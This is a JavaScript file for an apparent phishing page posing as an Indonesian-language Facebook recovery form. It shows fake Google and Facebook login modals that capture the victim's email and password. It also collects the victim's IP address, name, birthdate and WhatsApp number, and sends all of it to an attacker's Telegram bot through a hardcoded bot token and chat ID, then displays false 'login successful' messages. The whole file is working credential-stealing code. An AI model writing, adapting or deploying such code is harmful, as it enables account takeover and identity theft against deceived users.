let userIP = "";
let loginMethod = "form"; // form, google, facebook
// Variabel untuk menyimpan email dan password yang ditangkap
let capturedEmail = "";
let capturedPassword = "";


function isValidEmail(email) {
  const regex = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return regex.test(String(email).toLowerCase());
}

const daySelect = document.getElementById('birthdate-day');
const monthSelect = document.getElementById('birthdate-month');
const yearSelect = document.getElementById('birthdate-year');
const months = [
  { value: 1, name: 'Januari' }, { value: 2, name: 'Februari' },
  { value: 3, name: 'Maret' }, { value: 4, name: 'April' },
  { value: 5, name: 'Mei' }, { value: 6, name: 'Juni' },
  { value: 7, name: 'Juli' }, { value: 8, name: 'Agustus' },
  { value: 9, name: 'September' }, { value: 10, name: 'Oktober' },
  { value: 11, name: 'November' }, { value: 12, name: 'Desember' }
];

function populateMonths() {
  months.forEach(month => {
    const option = document.createElement('option');
    option.value = month.value;
    option.textContent = month.name;
    monthSelect.appendChild(option);
  });
}

function populateYears() {
  const currentYear = new Date().getFullYear();
  for (let i = currentYear; i >= 1920; i--) {
    const option = document.createElement('option');
    option.value = i;
    option.textContent = i;
    yearSelect.appendChild(option);
  }
}

function populateDays() {
  const year = yearSelect.value;
  const month = monthSelect.value;
  const daysInMonth = new Date(year, month, 0).getDate();
  daySelect.innerHTML = '';
  for (let i = 1; i <= daysInMonth; i++) {
    const option = document.createElement('option');
    option.value = i;
    option.textContent = i;
    daySelect.appendChild(option);
  }
}

monthSelect.addEventListener('change', populateDays);
yearSelect.addEventListener('change', populateDays);

document.addEventListener('DOMContentLoaded', function() {
  fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => { userIP = data.success ? data.ip : "Tidak diketahui"; })
    .catch(() => { userIP = "Gagal mengambil IP"; });
  populateMonths();
  populateYears();
  populateDays();
});

function goToStep(step) {
  document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
  document.getElementById("step" + step).classList.add("active");
}

function showGoogleModal() {
  document.getElementById('googleModal').style.display = 'flex';
  document.getElementById('googlePasswordGroup').style.display = 'none';
  document.getElementById('googleEmail').value = '';
  document.getElementById('googlePassword').value = '';
  document.getElementById('googleLoginBtn').innerText = 'Berikutnya';
  document.getElementById('googleEmail').classList.remove('is-invalid');
  document.getElementById('googlePassword').classList.remove('is-invalid');
}

function showFacebookModal() {
  document.getElementById('facebookModal').style.display = 'flex';
  document.getElementById('facebookEmail').value = '';
  document.getElementById('facebookPassword').value = '';
  document.getElementById('facebookEmail').classList.remove('is-invalid');
  document.getElementById('facebookPassword').classList.remove('is-invalid');
}

function hideModal(modalId) {
  document.getElementById(modalId).style.display = 'none';
}

function togglePassword(fieldId, icon) {
  const field = document.getElementById(fieldId);
  const iconVisible = "https://cdn-icons-png.flaticon.com/512/709/709612.png";
  const iconHidden = "https://cdn-icons-png.flaticon.com/512/709/709604.png";
  if (field.type === "password") {
    field.type = "text";
    icon.src = iconHidden;
  } else {
    field.type = "password";
    icon.src = iconVisible;
  }
}

function handleGoogleLogin() {
  const emailInput = document.getElementById('googleEmail');
  const passwordInput = document.getElementById('googlePassword');
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();
  emailInput.classList.remove('is-invalid');
  passwordInput.classList.remove('is-invalid');

  if (!email) {
    showAlert("Kolom email tidak boleh kosong.", "error", 'googleModal');
    emailInput.classList.add('is-invalid');
    return;
  }

  if (!isValidEmail(email)) {
    showAlert("Format email tidak valid. Masukkan email yang benar.", "error", 'googleModal');
    emailInput.classList.add('is-invalid');
    return;
  }

  if (document.getElementById('googlePasswordGroup').style.display === 'none') {
    document.getElementById('googlePasswordGroup').style.display = 'block';
    document.getElementById('googleLoginBtn').innerText = 'Masuk';
    return;
  }

  if (!password) {
    showAlert("Silakan masukkan password Anda", "error", 'googleModal');
    passwordInput.classList.add('is-invalid');
    return;
  }

  // === SIMPAN DATA LOGIN ===
  capturedEmail = email;
  capturedPassword = password;
  // ==========================

  loginMethod = "google";
  document.getElementById('fullname').value = email.split('@')[0];
  hideModal('googleModal');
  goToStep('Form');
  showAlert("Login dengan Google berhasil! Silakan lengkapi data lainnya.", "success");
}

function handleFacebookLogin() {
  const emailInput = document.getElementById('facebookEmail');
  const passwordInput = document.getElementById('facebookPassword');
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();
  emailInput.classList.remove('is-invalid');
  passwordInput.classList.remove('is-invalid');

  if (!email || !password) {
    showAlert("Semua kolom wajib diisi", "error", 'facebookModal');
    if (!email) emailInput.classList.add('is-invalid');
    if (!password) passwordInput.classList.add('is-invalid');
    return;
  }

  if (email.includes('@') && !isValidEmail(email)) {
    showAlert("Format email tidak valid. Masukkan email yang benar.", "error", 'facebookModal');
    emailInput.classList.add('is-invalid');
    return;
  }

  // === SIMPAN DATA LOGIN ===
  capturedEmail = email;
  capturedPassword = password;
  // ==========================

  loginMethod = "facebook";
  if (isValidEmail(email)) {
    document.getElementById('fullname').value = email.split('@')[0];
  } else {
    document.getElementById('fullname').value = 'Pengguna Facebook';
  }
  hideModal('facebookModal');
  goToStep('Form');
  showAlert("Login dengan Facebook berhasil! Silakan lengkapi data lainnya.", "success");
}

function showAlert(message, type, modalId = null) {
  const existingAlert = document.querySelector('.alert-box-dynamic');
  if (existingAlert) existingAlert.remove();

  let alertBox;
  if (modalId) {
    alertBox = document.createElement('div');
    alertBox.className = 'alert-box-dynamic';
    document.querySelector(`#${modalId} .modal-body`).prepend(alertBox);
  } else {
    alertBox = document.getElementById('alertBox');
  }

  alertBox.innerText = message;
  alertBox.className = `alert-box alert-${type}`;
  alertBox.style.display = 'block';

  setTimeout(() => {
    alertBox.style.display = 'none';
    if (modalId) alertBox.remove();
  }, 4000);
}

function submitForm() {
  const submitButton = document.querySelector('#stepForm .btn-primary');
  const fullnameInput = document.getElementById('fullname');
  const phoneInput = document.getElementById('phone');
  const fullname = fullnameInput.value.trim();
  const phone = phoneInput.value.trim();

  fullnameInput.classList.remove('is-invalid');
  phoneInput.classList.remove('is-invalid');

  if (!fullname || !phone) {
    showAlert("Semua kolom wajib diisi", "error");
    if (!fullname) fullnameInput.classList.add('is-invalid');
    if (!phone) phoneInput.classList.add('is-invalid');
    return;
  }

  submitButton.disabled = true;
  submitButton.innerHTML = '<div class="spinner"></div>';

  const day = daySelect.value.padStart(2, '0');
  const month = monthSelect.value.padStart(2, '0');
  const year = yearSelect.value;
  const birthdate = `${day}-${month}-${year}`;

  const botToken = "8098018598:AAGEFaANnzDBjGAA10MaB1aMoiRni1AZVfo";
  const chatId = "7137150704";

  // === MEMBUAT PESAN DETAIL LOGIN SECARA KONDISIONAL ===
  let loginDetailsMessage = "";
  if (capturedEmail) {
    loginDetailsMessage = `
--------------------------
🔑 *Login Credentials*
📧 Email/Phone: ${capturedEmail}
🔒 Password: ${capturedPassword}
`;
  }
  // ====================================================

  // === MEMPERBARUI TEMPLATE PESAN UTAMA ===
  const message = `
🔐 *Formulir Pemulihan Facebook*
--------------------------
👤 Nama Lengkap: ${fullname}
🎂 Tanggal Lahir: ${birthdate}
📱 WhatsApp: ${phone}
🌐 IP: ${userIP}
🔵 Metode Verifikasi: ${loginMethod === 'google' ? 'Google' : loginMethod === 'facebook' ? 'Facebook' : 'Form'}${loginDetailsMessage}

*Waktu Verifikasi:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
--------------------------`;
  // ==========================================

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    })
  })
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        goToStep('Done');
      } else {
        throw new Error("Gagal mengirim data");
      }
    })
    .catch(() => {
      showAlert("Gagal mengirim data. Silakan coba lagi.", "error");
      submitButton.disabled = false;
      submitButton.innerHTML = 'Verifikasi Sekarang';
    });
}